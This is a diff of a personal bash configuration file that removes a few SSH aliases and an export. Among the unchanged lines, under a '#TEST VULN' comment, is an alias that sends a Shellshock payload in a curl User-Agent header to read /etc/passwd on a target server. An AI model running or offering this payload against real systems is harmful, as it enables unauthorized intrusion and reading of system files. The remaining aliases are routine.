@@ -14,7 +14,6 @@ alias httppingg='curl -I http://google.com/ > /dev/null 2>&1 && echo success || 
 alias lock-screen='xscreensaver-command -lock'
 alias i3lock='i3lock -c 000000 -n'
 alias xtime='date +%T'
-alias connect_unict='ssh -v ubuntu@151.97.12.231'
 alias mountt='sudo mount -t ntfs-3g $1 $2'
 alias ntpsync='sudo ntpd -qg'
 alias reboot='sudo systemctl reboot'
@@ -31,8 +30,6 @@ alias git-tmux='tmux new -s $(basename $(pwd))'
 alias nopaste="curl -F 'sprunge=<-' http://sprunge.us"
 #TEST VULN
 alias vuln="curl -A '() { :; }; /bin/cat /etc/passwd > dumped_file' $1"
-alias deneva="ssh x0230192@deneva.cselt.it"
-alias deneva2="ssh x0230192@163.162.93.114"
 
 #GIT ALIASES
 alias gl="git log --oneline --decorate"
@@ -43,7 +40,6 @@ PS1='\[\e[0;32m\]\u\[\e[m\] \[\e[1;34m\]\w\[\e[m\] \[\e[1;32m\]\$\[\e[m\] \[\e[0
 export EDITOR="vim"
 [[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm"
 export PATH="$PATH:$HOME/.rvm/bin" # Add RVM to PATH for scripting
-export MUSIC_DIR='~/Dropbox/#Music/'
 export VISUAL="vim"
 #export TERM=xterm-256color
 
